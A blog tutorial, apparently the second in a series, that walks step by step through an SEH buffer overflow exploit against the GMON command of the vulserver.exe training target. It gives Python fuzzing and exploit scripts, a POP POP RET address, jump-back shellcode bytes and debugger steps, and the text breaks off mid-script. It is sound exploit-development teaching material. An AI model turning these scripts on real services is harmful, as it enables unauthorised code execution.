---
layout: post
title: "Stack Based Buffer Overflows Structured Exception Handler (SEH) Part 2"
---

# Structured Exception Handler

Let's go through this again from **[Stack Based Buffer Overflows Part 1](https://memn0ps.github.io/2020/01/25/Stack-Based-Buffer-Overflows-Part-1.html)**

## What is a Buffer Overflow?


A buffer overflow is when an application attempts to write more data in a buffer than expected or when an application attempts to write more data in a memory area past a buffer. A buffer is a sequential section of memory that is allocated to contain anything from strings to integers. Going past the memory area of the allocated block can crash the program, corrupt data and even execute malicious code.

Here we will be discussing a SEH buffer overflow without any memory protections such as DEP or ASLR. Bypassing DEP and ASLR will be addressed in the upcoming blogs.


## What is Structured Exception Handling (SEH)?

Structured exception handling is a Windows mechanism for dealing with hardware and software exceptions using a data structure called a linked list. A linked list is a collection of nodes which together represent a sequence, each node points to the next node, and every node contains a reference and data.


Example
```c++
try {
    //Block of protected code
} 
catch () {
    // code to execute when an exception occurs
}
```

When an exception occurs the operating system goes through the SEH Chain, and each Structured Exception Handler (SEH) is analysed by calling the exception callback function, inspecting the details found in the exception and content records, to see if it can handle the exception. However, if the exception fails to be handled then `ExceptionContinueSearch` function is returned, and the operating system moves to the address of the next record pointed to by `Next SEH`, continuing down the SEH chain until it finds a suitable exception handler or reaches the last, default handler (FFFFFFFF).



Here is an image that explains the SEH Chain.

![](/images/2020-01-27-Stack-Based-Buffer-Overflows-SEH-Part-2/Explain_SEH.png)

**Credits to ([Securitysift](https://www.securitysift.com/windows-exploit-development-part-6-seh-exploits/))**



## Objective

As discussed before, usually the objective of a buffer overflow is to get remote code execution by controlling the EIP register (x86 or 32 bit). The EIP register is the instruction pointer which tells the CPU to execute the instructions it’s pointing at. Once we have control of this register, we can redirect the execution flow of the program to our liking, which can be malicious shellcode that sends a connection back aka reverse shell. However, many problems can be faced during this objective.

This brings me to my next point.

The "Exception Registration Record" (SEH) is a pointer to the current record and the "Next Exception Registration Record" is a pointer to the next record (nSEH). 

When an exception occurs we will see that these records are reversed `[nSEH] -> [SEH]`, since windows stack grows downwards and `SEH` will be located at `ESP + 8`.

When we overwrite a Structured Exception Handler, windows will zero out the CPU registers, so we won't be able to jump to our shellcode directly, this is a protection mechanism by windows which is luckily flawed.

The way to bypass this flawed mechanism is to overwrite SEH with a pointer to `POP POP RET` instruction. The first POP instruction removes 4-bytes from the top of the stack and the second POP remove another 4-bytes from the top of the stack, the RET instruction will return execution to the top of the stack.


We need to keep in mind that SEH is located at `ESP + 8` so incrementing the stack with 8-bytes and returning to the new pointer at the top of the stack will cause us to execute  `nSEH`. 

In this scenario, we will only have 4 bytes of space at nSEH which we will use to place a short jump back (`JMP SHORT`) into our buffer then we will have around 45 bytes to play around with. We will use those 45 bytes to place a 17-byte 2nd stage payload which will make a longer jump back into our buffer and give us around 512 bytes to place our reverse shell.

There is a better way of doing this which is called an egg hunter, however, we won't cover that in this blog, maybe the next :)


This should give you a good picture of what we are about to do.

![](/images/2020-01-27-Stack-Based-Buffer-Overflows-SEH-Part-2/SEH_Exploit_Buffer.png)

**Credits to ([Securitysift](https://www.securitysift.com/windows-exploit-development-part-6-seh-exploits/))**


Let's see this in practice.



## Fuzzing
Fuzzing is sending a large amount of buffer with malformed data into the user input field and observe the application for unexpected crashes.

We will be fuzzing a parameter for `vulserver.exe` which is `GMON`. After a bit of fuzzing the GMON parameter appears to be vulnerable to an SEH overwrite.

The string `GMON /.../` and 5012 A's crashed the application. You can observe this using wireshark/tcpdump.

I usually use Spike or Boofuzz. Boofuzz gives some very detailed output and even has a web portal.

Here is the boofuzz fuzzing exploit.

```python
#!/usr/bin/python

from boofuzz import *

#Target IP
host = '192.168.81.129'

#Target port
port = 9999

#Protocol
protocol = "tcp"

def main():
    session = Session(target = Target(connection = SocketConnection(host, port, proto=protocol)))
    
    #Give our session a name, "GMON"
    s_initialize("GMON")
    
    #First block of our request
    s_string("GMON", fuzzable=False)

    #Next block of our request which contains a space that is needed between command and value.
    s_delim(" ", fuzzable=False)

    #This block represents the value for the command and boofuzz will fuzz this
    s_string("FUZZ")

    #Connect to the server
    session.connect(s_get("GMON"))

    #Start fuzzing
    session.fuzz()

if __name__ == "__main__":
    main()
```

You can find fuzzing resources here.
* https://github.com/secfigo/Awesome-Fuzzing


## Replicating Crash


After attaching the debugger to the process, we can see the process appears to be running.


![](/images/2020-01-27-Stack-Based-Buffer-Overflows-SEH-Part-2/Normal_Debugger.png)


We send the exploit to trigger the buffer overflow.

```python
#!/usr/bin/python

import socket

host = "192.168.81.129"
port = 9999

payload = "A" * 5012

print("Payload length: " + str(len(payload)))

try:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host,port))
    s.recv(1024)
    print("[+] Sending exploit!")
    s.send("GMON /.../" + payload)
    print("[+] Exploit sent!")
    s.close()
except:
    print("[-] Could not connect to server!")
 

```

After sending the exploit, we have a crash. When the crash occurs, the application gets redirected to the Structured Exception handler which we have overwritten with 41414141 (4 A's). 

![](/images/2020-01-27-Stack-Based-Buffer-Overflows-SEH-Part-2/First_Crash.png)


Let's view the SEH chain. Clicking `View -> SEH Chains` or simply pressing `ALT + s` reveals a vanilla SEH overwrite. Here we  can see our 4 A's

![](/images/2020-01-27-Stack-Based-Buffer-Overflows-SEH-Part-2/SEH_Chain.png)

Let's allow the exception to occur by pressing `Shift + F7/F8/f9`

The interesting thing about these types of exploits is the location of the buffer after the crash, most commonly in Structured Exception Handlers, you will find your buffer on the stack, as shown in the screenshot.

![](/images/2020-01-27-Stack-Based-Buffer-Overflows-SEH-Part-2/Vanilla_SEH_Overwrite.png)


To get to our buffer, rather than trying to jump at registers such as `JMP ESP` or `JMP EBX` we will try to find a sequence of instructions which will lead us to our C's.

So ideally we should be looking for a `POP POP RET`, which will POP the first value off the stack then the second value off the stack and then return to our user-controlled buffer.

Before we start looking for a POP POP RET, let's get control of the EIP register as usual.

## Controlling EIP

Here we will generate a unique pattern of 5012 bytes.

![](/images/2020-01-27-Stack-Based-Buffer-Overflows-SEH-Part-2/Pattern.png)


Modify and send the exploit.
```python
#!/usr/bin/python

import socket

host = "192.168.81.129"
port = 9999

pattern = ("Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk6Bk7Bk8Bk9Bl0Bl1Bl2Bl3Bl4Bl5Bl6Bl7Bl8Bl9Bm0Bm1Bm2Bm3Bm4Bm5Bm6Bm7Bm8Bm9Bn0Bn1Bn2Bn3Bn4Bn5Bn6Bn7Bn8Bn9Bo0Bo1Bo2Bo3Bo4Bo5Bo6Bo7Bo8Bo9Bp0Bp1Bp2Bp3Bp4Bp5Bp6Bp7Bp8Bp9Bq0Bq1Bq2Bq3Bq4Bq5Bq6Bq7Bq8Bq9Br0Br1Br2Br3Br4Br5Br6Br7Br8Br9Bs0Bs1Bs2Bs3Bs4Bs5Bs6Bs7Bs8Bs9Bt0Bt1Bt2Bt3Bt4Bt5Bt6Bt7Bt8Bt9Bu0Bu1Bu2Bu3Bu4Bu5Bu6Bu7Bu8Bu9Bv0Bv1Bv2Bv3Bv4Bv5Bv6Bv7Bv8Bv9Bw0Bw1Bw2Bw3Bw4Bw5Bw6Bw7Bw8Bw9Bx0Bx1Bx2Bx3Bx4Bx5Bx6Bx7Bx8Bx9By0By1By2By3By4By5By6By7By8By9Bz0Bz1Bz2Bz3Bz4Bz5Bz6Bz7Bz8Bz9Ca0Ca1Ca2Ca3Ca4Ca5Ca6Ca7Ca8Ca9Cb0Cb1Cb2Cb3Cb4Cb5Cb6Cb7Cb8Cb9Cc0Cc1Cc2Cc3Cc4Cc5Cc6Cc7Cc8Cc9Cd0Cd1Cd2Cd3Cd4Cd5Cd6Cd7Cd8Cd9Ce0Ce1Ce2Ce3Ce4Ce5Ce6Ce7Ce8Ce9Cf0Cf1Cf2Cf3Cf4Cf5Cf6Cf7Cf8Cf9Cg0Cg1Cg2Cg3Cg4Cg5Cg6Cg7Cg8Cg9Ch0Ch1Ch2Ch3Ch4Ch5Ch6Ch7Ch8Ch9Ci0Ci1Ci2Ci3Ci4Ci5Ci6Ci7Ci8Ci9Cj0Cj1Cj2Cj3Cj4Cj5Cj6Cj7Cj8Cj9Ck0Ck1Ck2Ck3Ck4Ck5Ck6Ck7Ck8Ck9Cl0Cl1Cl2Cl3Cl4Cl5Cl6Cl7Cl8Cl9Cm0Cm1Cm2Cm3Cm4Cm5Cm6Cm7Cm8Cm9Cn0Cn1Cn2Cn3Cn4Cn5Cn6Cn7Cn8Cn9Co0Co1Co2Co3Co4Co5Co6Co7Co8Co9Cp0Cp1Cp2Cp3Cp4Cp5Cp6Cp7Cp8Cp9Cq0Cq1Cq2Cq3Cq4Cq5Cq6Cq7Cq8Cq9Cr0Cr1Cr2Cr3Cr4Cr5Cr6Cr7Cr8Cr9Cs0Cs1Cs2Cs3Cs4Cs5Cs6Cs7Cs8Cs9Ct0Ct1Ct2Ct3Ct4Ct5Ct6Ct7Ct8Ct9Cu0Cu1Cu2Cu3Cu4Cu5Cu6Cu7Cu8Cu9Cv0Cv1Cv2Cv3Cv4Cv5Cv6Cv7Cv8Cv9Cw0Cw1Cw2Cw3Cw4Cw5Cw6Cw7Cw8Cw9Cx0Cx1Cx2Cx3Cx4Cx5Cx6Cx7Cx8Cx9Cy0Cy1Cy2Cy3Cy4Cy5Cy6Cy7Cy8Cy9Cz0Cz1Cz2Cz3Cz4Cz5Cz6Cz7Cz8Cz9Da0Da1Da2Da3Da4Da5Da6Da7Da8Da9Db0Db1Db2Db3Db4Db5Db6Db7Db8Db9Dc0Dc1Dc2Dc3Dc4Dc5Dc6Dc7Dc8Dc9Dd0Dd1Dd2Dd3Dd4Dd5Dd6Dd7Dd8Dd9De0De1De2De3De4De5De6De7De8De9Df0Df1Df2Df3Df4Df5Df6Df7Df8Df9Dg0Dg1Dg2Dg3Dg4Dg5Dg6Dg7Dg8Dg9Dh0Dh1Dh2Dh3Dh4Dh5Dh6Dh7Dh8Dh9Di0Di1Di2Di3Di4Di5Di6Di7Di8Di9Dj0Dj1Dj2Dj3Dj4Dj5Dj6Dj7Dj8Dj9Dk0Dk1Dk2Dk3Dk4Dk5Dk6Dk7Dk8Dk9Dl0Dl1Dl2Dl3Dl4Dl5Dl6Dl7Dl8Dl9Dm0Dm1Dm2Dm3Dm4Dm5Dm6Dm7Dm8Dm9Dn0Dn1Dn2Dn3Dn4Dn5Dn6Dn7Dn8Dn9Do0Do1Do2Do3Do4Do5Do6Do7Do8Do9Dp0Dp1Dp2Dp3Dp4Dp5Dp6Dp7Dp8Dp9Dq0Dq1Dq2Dq3Dq4Dq5Dq6Dq7Dq8Dq9Dr0Dr1Dr2Dr3Dr4Dr5Dr6Dr7Dr8Dr9Ds0Ds1Ds2Ds3Ds4Ds5Ds6Ds7Ds8Ds9Dt0Dt1Dt2Dt3Dt4Dt5Dt6Dt7Dt8Dt9Du0Du1Du2Du3Du4Du5Du6Du7Du8Du9Dv0Dv1Dv2Dv3Dv4Dv5Dv6Dv7Dv8Dv9Dw0Dw1Dw2Dw3Dw4Dw5Dw6Dw7Dw8Dw9Dx0Dx1Dx2Dx3Dx4Dx5Dx6Dx7Dx8Dx9Dy0Dy1Dy2Dy3Dy4Dy5Dy6Dy7Dy8Dy9Dz0Dz1Dz2Dz3Dz4Dz5Dz6Dz7Dz8Dz9Ea0Ea1Ea2Ea3Ea4Ea5Ea6Ea7Ea8Ea9Eb0Eb1Eb2Eb3Eb4Eb5Eb6Eb7Eb8Eb9Ec0Ec1Ec2Ec3Ec4Ec5Ec6Ec7Ec8Ec9Ed0Ed1Ed2Ed3Ed4Ed5Ed6Ed7Ed8Ed9Ee0Ee1Ee2Ee3Ee4Ee5Ee6Ee7Ee8Ee9Ef0Ef1Ef2Ef3Ef4Ef5Ef6Ef7Ef8Ef9Eg0Eg1Eg2Eg3Eg4Eg5Eg6Eg7Eg8Eg9Eh0Eh1Eh2Eh3Eh4Eh5Eh6Eh7Eh8Eh9Ei0Ei1Ei2Ei3Ei4Ei5Ei6Ei7Ei8Ei9Ej0Ej1Ej2Ej3Ej4Ej5Ej6Ej7Ej8Ej9Ek0Ek1Ek2Ek3Ek4Ek5Ek6Ek7Ek8Ek9El0El1El2El3El4El5El6El7El8El9Em0Em1Em2Em3Em4Em5Em6Em7Em8Em9En0En1En2En3En4En5En6En7En8En9Eo0Eo1Eo2Eo3Eo4Eo5Eo6Eo7Eo8Eo9Ep0Ep1Ep2Ep3Ep4Ep5Ep6Ep7Ep8Ep9Eq0Eq1Eq2Eq3Eq4Eq5Eq6Eq7Eq8Eq9Er0Er1Er2Er3Er4Er5Er6Er7Er8Er9Es0Es1Es2Es3Es4Es5Es6Es7Es8Es9Et0Et1Et2Et3Et4Et5Et6Et7Et8Et9Eu0Eu1Eu2Eu3Eu4Eu5Eu6Eu7Eu8Eu9Ev0Ev1Ev2Ev3Ev4Ev5Ev6Ev7Ev8Ev9Ew0Ew1Ew2Ew3Ew4Ew5Ew6Ew7Ew8Ew9Ex0Ex1Ex2Ex3Ex4Ex5Ex6Ex7Ex8Ex9Ey0Ey1Ey2Ey3Ey4Ey5Ey6Ey7Ey8Ey9Ez0Ez1Ez2Ez3Ez4Ez5Ez6Ez7Ez8Ez9Fa0Fa1Fa2Fa3Fa4Fa5Fa6Fa7Fa8Fa9Fb0Fb1Fb2Fb3Fb4Fb5Fb6Fb7Fb8Fb9Fc0Fc1Fc2Fc3Fc4Fc5Fc6Fc7Fc8Fc9Fd0Fd1Fd2Fd3Fd4Fd5Fd6Fd7Fd8Fd9Fe0Fe1Fe2Fe3Fe4Fe5Fe6Fe7Fe8Fe9Ff0Ff1Ff2Ff3Ff4Ff5Ff6Ff7Ff8Ff9Fg0Fg1Fg2Fg3Fg4Fg5Fg6Fg7Fg8Fg9Fh0Fh1Fh2Fh3Fh4Fh5Fh6Fh7Fh8Fh9Fi0Fi1Fi2Fi3Fi4Fi5Fi6Fi7Fi8Fi9Fj0Fj1Fj2Fj3Fj4Fj5Fj6Fj7Fj8Fj9Fk0Fk1Fk2Fk3Fk4Fk5Fk6Fk7Fk8Fk9Fl0Fl1Fl2Fl3Fl4Fl5Fl6Fl7Fl8Fl9Fm0Fm1Fm2Fm3Fm4Fm5Fm6Fm7Fm8Fm9Fn0Fn1Fn2Fn3Fn4Fn5Fn6Fn7Fn8Fn9Fo0Fo1Fo2Fo3Fo4Fo5Fo6Fo7Fo8Fo9Fp0Fp1Fp2Fp3Fp4Fp5Fp6Fp7Fp8Fp9Fq0Fq1Fq2Fq3Fq4Fq5Fq6Fq7Fq8Fq9Fr0Fr1Fr2Fr3Fr4Fr5Fr6Fr7Fr8Fr9Fs0Fs1Fs2Fs3Fs4Fs5Fs6Fs7Fs8Fs9Ft0Ft1Ft2Ft3Ft4Ft5Ft6Ft7Ft8Ft9Fu0Fu1Fu2Fu3Fu4Fu5Fu6Fu7Fu8Fu9Fv0Fv1Fv2Fv3Fv4Fv5Fv6Fv7Fv8Fv9Fw0Fw1Fw2Fw3Fw4Fw5Fw6Fw7Fw8Fw9Fx0Fx1Fx2Fx3Fx4Fx5Fx6Fx7Fx8Fx9Fy0Fy1Fy2Fy3Fy4Fy5Fy6Fy7Fy8Fy9Fz0Fz1Fz2Fz3Fz4Fz5Fz6Fz7Fz8Fz9Ga0Ga1Ga2Ga3Ga4Ga5Ga6Ga7Ga8Ga9Gb0Gb1Gb2Gb3Gb4Gb5Gb6Gb7Gb8Gb9Gc0Gc1Gc2Gc3Gc4Gc5Gc6Gc7Gc8Gc9Gd0Gd1Gd2Gd3Gd4Gd5Gd6Gd7Gd8Gd9Ge0Ge1Ge2Ge3Ge4Ge5Ge6Ge7Ge8Ge9Gf0Gf1Gf2Gf3Gf4Gf5Gf6Gf7Gf8Gf9Gg0Gg1Gg2Gg3Gg4Gg5Gg6Gg7Gg8Gg9Gh0Gh1Gh2Gh3Gh4Gh5Gh6Gh7Gh8Gh9Gi0Gi1Gi2Gi3Gi4Gi5Gi6Gi7Gi8Gi9Gj0Gj1Gj2Gj3Gj4Gj5Gj6Gj7Gj8Gj9Gk0Gk1Gk2Gk3Gk4Gk5Gk6Gk7Gk8Gk9Gl")
payload = pattern

print("Payload length: " + str(len(payload)))

try:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host,port))
    s.recv(1024)
    print("[+] Sending exploit!")
    s.send("GMON /.../" + payload)
    print("[+] Exploit sent!")
    s.close()
except:
    print("[-] Could not connect to server!")



```


Here we can see the EIP is overwritten with `336E4532`.

![](/images/2020-01-27-Stack-Based-Buffer-Overflows-SEH-Part-2/Pattern_Crash.png)



The offset is located at `3518` which means that EIP will be overwritten after `3518` A's


![](/images/2020-01-27-Stack-Based-Buffer-Overflows-SEH-Part-2/Pattern_Offset.png)


Here we modify the exploit to overwrite the EIP register with 4 B's and the rest of the buffer will be padding with C's.

```python
#!/usr/bin/python

import socket

host = "192.168.81.129"
port = 9999

SEH = "B" * 4

payload = "A" * 3518
payload += SEH
payload += "C" * (5012 - len(payload))

print("Payload length: " + str(len(payload)))

try:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host,port))
    s.recv(1024)
    print("[+] Sending exploit!")
    s.send("GMON /.../" + payload)
    print("[+] Exploit sent!")
    s.close()
except:
    print("[-] Could not connect to server!")


```


Now we have full control of the EIP register.


![](/images/2020-01-27-Stack-Based-Buffer-Overflows-SEH-Part-2/Controll_EIP.png)



## Bad Characters

As usual, let's identify the bad characters before finding a `POP POP RET` just in case one of the addresses has a bad character. We will take out \x00 as it is usually always a bad character.

Depending on the application, vulnerability type and protocols in use, there may be certain characters that can truncate our buffer, which is considered to be bad chars.

An example of a very common bad character (especially in buffer overflows caused by unchecked string copy operations) is the null byte (0x00).

0x00 is considered a bad because a null byte is also used to terminate a string copy operation, which would effectively truncate our buffer to wherever the first null byte appears.

The reason we want to get rid of bad chars is that when we generate our reverse shell using msfvenom we can luckily say which char is a bad one and msfvenom will get rid of it.

We can use the `!mona bytearray` once again, to generate characters from `\x00 to \xFF`

![](/images/2020-01-27-Stack-Based-Buffer-Overflows-SEH-Part-2/Mona_Bytearray.png) 

Let's modify and run the exploit.

```python
!/usr/bin/python

import socket

host = "192.168.81.129"
port = 9999

badchars = ("\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f"
"\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f"
"\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f"
"\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f"
"\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf"
"\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf"
"\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff")

SEH = "B" * 4

payload = "A" * (3518 - len(badchars))
payload += badchars
payload += SEH
payload += "C" * (5012 - len(payload))

print("Payload length: " + str(len(payload)))

try:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host,port))
    s.recv(1024)
    print("[+] Sending exploit!")
    s.send("GMON /.../" + payload)
    print("[+] Exploit sent!")
    s.close()
except:
    print("[-] Could not connect to server!")
```



After searching for our buffer, it seems the only bad char was `\x00`

![](/images/2020-01-27-Stack-Based-Buffer-Overflows-SEH-Part-2/badchars.png)




## Locating a Return Address

Now that we have full control over the EIP register, we need to find a `POP POP RET` instruction.

Why? Let's go through it again.

In order to get to our buffer, rather than trying to jump at registers such as `JMP ESP` or `JMP EBX` we will try to find a sequence of instructions which will lead us to our C's.

So ideally we should be looking for a `POP POP RET`, which will POP the first value off the stack then the second value off the stack and then return to our user-controlled buffer.



The best way to do this is to use the immunity debugger mona script to search for `POP POP RET`. We have to make sure our address meets the following criteria:

* Does not Data Execution Prevention (DEP) 
* Does not have Address Space Layout Randomization (ASLR) enabled
* Does not contain a NULL Byte (00)
* Does not SafeSEH enabled

What is Safe SEH?

SafeSEH is a protection mechanism that prevents SEH-based exploits by validating exception handlers and storing them in a table. Prior to executing a given exception handler, the addresses in this tabled are checked to ensure it is safe. Due to this, the `POP POP RET` addresses that are used to overwrite the SEH record will come from a module compiled with `SafeSEH` and will not appear in the table causing the exploit to fail.


As long as the address of `POP POP RET` does not come from a module compiled with SafeSEH, we are good to go. By default application modules are not compiled with the `SafeSEH` and even if they were then you could search for other loaded modules loaded by the application that were not compiled with the `SafeSEH` using `!mona modules`.

Feel free to read more about `SafeSEH` on google.



After running `!mona seh`, mona reveals that there are a total of 18 pointers, let's pick one the second one `625010B4` at `essfunc.dll`

![](/images/2020-01-27-Stack-Based-Buffer-Overflows-SEH-Part-2/Mona_SEH.png)



Let's use this address with our exploit to ensure this work.

```python
#!/usr/bin/python

import socket

host = "192.168.81.129"
port = 9999

#625010B4 \xB4\x10\x50\x62
SEH = "\xB4\x10\x50\x62"

payload = "A" * 3518
payload += SEH
payload += "C" * (5012 - len(payload))

print("Payload length: " + str(len(payload)))

try:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host,port))
    s.recv(1024)
    print("[+] Sending exploit!")
    s.send("GMON /.../" + payload)
    print("[+] Exploit sent!")
    s.close()
except:
    print("[-] Could not connect to server!")


```

We can put a breakpoint to observe the behaviour. (After searching for the address `625010B4`, press F2 to put a breakpoint).

We send the exploit and let the exception occur. As you can see, EIP now points to `POP` followed by another `POP` and then followed by `RET`.


![](/images/2020-01-27-Stack-Based-Buffer-Overflows-SEH-Part-2/Before_POP.png)


Now lets press `F7` to `step into` and execute the first `POP`

As you see the first `POP`, POP'd the value on the stack into `EBX` 

![](/images/2020-01-27-Stack-Based-Buffer-Overflows-SEH-Part-2/POP_First.png)

Now lets press `F7` to `step into` and execute the second `POP`

As you see the second `POP`, POP'd the value on the stack into `EBP` 


![](/images/2020-01-27-Stack-Based-Buffer-Overflows-SEH-Part-2/Second_POP.png)


Now lets press `F7` to `step into` and execute `RET`

As you can see the `RET` instruction returned execution to the top of the stack, and now we have landed on `nSEH` which is our 41's, just before our `SEH` instruction. However, we have around 4 bytes to maneuver around.


![](/images/2020-01-27-Stack-Based-Buffer-Overflows-SEH-Part-2/After_RET.png)



## First Stage Payload

So we have succeeded in redirecting the execution flow of the program! Now we have these 4 bytes to work with. Unfortunately, that is not enough to place our shellcode. A standard reverse shell takes anywhere between 350 to 400 bytes of space.  


We need to get out of this very tight corner. We could perform a negative jump up the buffer and gain approximately 45 bytes of buffer space to execute our secondary payload.


Let's take a small jump back into the buffer using those 4 bytes as we have plenty of space before. We want to make sure we don't overwrite our `SEH -> POP POP RET` instructions.

Let's put that in our exploit, make sure you do that math correctly, you must take away if you are adding. Since we want to add nSEH before SEH, we will take away 4 bytes from A's. We must do this process properly or hours will be wasted looking at the screen. Yes, I've done that before.

```python
#!/usr/bin/python

import socket

host = "192.168.81.129"
port = 9999

#625010B4 \xB4\x10\x50\x62
SEH = "\xB4\x10\x50\x62"
#JMP SHORT \xEB\xD0\x90\x90
nSEH = "\xEB\xD0\x90\x90"

payload = "A" * (3518 - len(nSEH))
payload += nSEH
payload += SEH
payload += "C" * (5012 - len(payload))

print("Payload length: " + str(len(payload)))

try:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host,port))
    s.recv(1024)
    print("[+] Sending exploit!")
    s.send("GMON /.../" + payload)
    print("[+] Exploit sent!")
    s.close()
except:
    print("[-] Could not connect to server!")
```





We can see that the `JMP SHORT` instruction will lead us to `0188FF96` which is somewhere in our A's

Let's put a breakpoint on `0188FF96` before hitting F7 to step into.

![](/images/2020-01-27-Stack-Based-Buffer-Overflows-SEH-Part-2/Before_ShortJump.png)


Counting the bytes, it seems we have around 45 bytes of space, which won't be enough for a reverse shell. However, there are a few ways...


![](/images/2020-01-27-Stack-Based-Buffer-Overflows-SEH-Part-2/Jump.png)

## Second Stage Payload

Note: We can use an Egghunter which is a better option. However, I won't be going over that in this tutorial, maybe the next :)

A small trick to jump up and down our buffer can be found in the Phrack #62 Article 7 Originally written by Aaron Adams.

Let's take a look at this shellcode.

This shellcode uses an interesting method of floating-point calculations, to identify the location of `EIP` and copy it into `ECX`. Once that location is in `ECX`, we can increase or decrease `ECX` by as much as we need to gain extra space for our shellcode. In this example, we will be jumping back 512 bytes.

```assembly
############################################################
# 1st stage shellcode:
############################################################
# [BITS 32]
#
# global _start
#
# _start:
#
# ;--- Taken from Phrack #62 Article 7 Originally written by Aaron Adams
#
# ;--- copy eip into ecx
# fldz
# fnstenv [esp-12]
# pop ecx
# add cl, 10
# nop
# ;----------------------------------------------------------------------
# dec ch ; ecx=-256;
# dec ch ; ecx=-256;
# jmp ecx ; lets jmp ecx (current location - 512)
```
**Credits to ([Phrack](http://phrack.org/issues/62/7.html))**

We compile this code with NASM, and look at the resulting binary code:

```
D9EED97424F45980C10A90FECDFECDFFE1 
```

Lets put this code in our exploit. I will replace some of the A's with memN0ps :p. So we can slide into our 2nd stage payload.

```python
#!/usr/bin/python

import socket

host = "192.168.81.129"
port = 9999

#625010B4 \xB4\x10\x50\x62
SEH = "\xB4\x10\x50\x62"
#JMP SHORT \xEB\xD0\x90\x90
nSEH = "\xEB\xD0\x90\x90"
#D9EED97424F45980C10A90FECDFECDFFE1
jumpback = "\xD9\xEE\xD9\x74\x24\xF4\x59\x80\xC1\x0A\x90\xFE\xCD\xFE\xCD\xFF\xE1"
#\x90
memn0ps = "\x90"

payload = "A" * (3518 - 50 - len(jumpback) - len(nSEH))
payload += memn0ps * 50
payload += jumpback
payload += nSEH
payload += SEH
payload += "C" * (5012 - len(payload))

print("Payload length: " + str(len(payload)))

try:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host,port))
    s.recv(1024)
    print("[+] Sending exploit!")
    s.send("GMON /.../" + payload)
    print("[+] Exploit sent!")
    s.close()
except:
